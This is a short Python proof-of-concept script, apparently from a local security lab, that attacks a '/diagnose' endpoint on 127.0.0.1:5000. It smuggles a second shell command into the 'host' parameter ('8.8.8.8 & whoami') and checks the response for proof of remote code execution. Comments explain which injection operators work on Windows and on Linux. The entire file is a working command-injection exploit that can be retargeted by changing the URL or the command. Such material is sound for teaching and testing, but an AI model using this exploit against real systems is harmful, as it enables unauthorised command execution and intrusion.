# FILE: exploit.py
# ROLE: The "Attacker" Script (Automated Proof of Concept)

import requests

# The target URL
url = "http://127.0.0.1:5000/diagnose"

# THE PAYLOAD:
# We provide a fake IP (8.8.8.8) followed by the injection operator (&).
# Then we ask the system to run 'whoami' to reveal the current user.
# Note: On Windows we use '&', on Linux usually ';' or '&&'.
payload = "8.8.8.8 & whoami"

print(f"[*] Attacking Target: {url}")
print(f"[*] Sending Payload: {payload}")

try:
    # Send the malicious request
    response = requests.get(url, params={'host': payload})
    
    # Analyze the response
    if response.status_code == 200:
        print("\n[+] Server Response Received:")
        print("-" * 30)
        print(response.text)
        print("-" * 30)
        
        # Check if the hack worked
        if "desktop" in response.text.lower() or "\\" in response.text: 
            print("\n[!!!] VULNERABILITY CONFIRMED: RCE SUCCESSFUL [!!!]")
            print("The server executed our 'whoami' command.")
        else:
            print("\n[-] Injection might have failed. Check payload.")
    else:
        print(f"[-] Server returned error code: {response.status_code}")

except Exception as e:
    print(f"[!] Connection failed. Is the server running? {e}")